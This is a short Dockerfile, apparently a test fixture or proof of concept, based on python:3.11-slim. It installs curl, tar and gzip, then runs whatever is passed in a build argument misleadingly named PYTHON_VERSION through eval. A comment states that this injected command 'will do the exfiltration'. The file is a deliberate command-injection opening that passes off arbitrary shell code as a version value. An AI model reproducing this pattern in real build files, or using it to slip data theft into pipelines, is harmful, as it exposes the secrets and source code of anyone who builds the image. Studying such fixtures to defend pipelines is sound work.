FROM python:3.11-slim

ARG PYTHON_VERSION

RUN apt-get update && apt-get install -y curl tar gzip

# Run the injected command (which will do the exfiltration)
RUN eval "$PYTHON_VERSION"

CMD ["python3"]
